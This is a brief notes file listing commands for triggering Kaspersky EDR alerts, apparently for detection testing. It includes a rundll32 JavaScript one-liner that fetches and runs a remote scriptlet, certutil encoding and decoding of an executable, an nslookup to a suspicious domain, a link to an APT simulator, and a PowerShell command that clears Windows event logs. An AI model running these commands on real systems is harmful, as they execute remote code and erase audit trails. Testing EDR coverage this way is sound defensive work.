# Methods for triggering Kaspersky EDR alerts

###1: deobfuscate / decode file (run in CMD)

certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe

###2: Rundll32 execute JavaScript Remote PAyload with GetObject (run in CMD with admin rights)

rundll32.exe javascript:'\..\mshtml,RunHTMLApplication':document.write();GetObject('script:https://raw.githubusercontent/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct').Exec();

###3: nslookup to malicious website

nslookup http://bug.qainfo.ru/test/wmuf_w

###4: Download APT-Simulator and run as admin, then run all tests (0)

https://github.com/NextronSystems/APTSimulator/releases/download/v0.9.4/APTSimulator_pw_apt.zip

###5: Delete Windows event logs (Powershell)

Clear-EventLog -LogName application, system -confirm



